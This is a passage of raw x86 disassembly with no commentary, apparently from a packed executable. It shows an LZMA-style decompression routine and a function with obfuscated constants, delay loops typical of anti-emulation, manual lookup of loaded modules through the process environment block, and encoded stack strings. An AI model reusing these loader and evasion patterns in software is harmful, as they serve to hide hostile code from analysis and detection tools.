  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
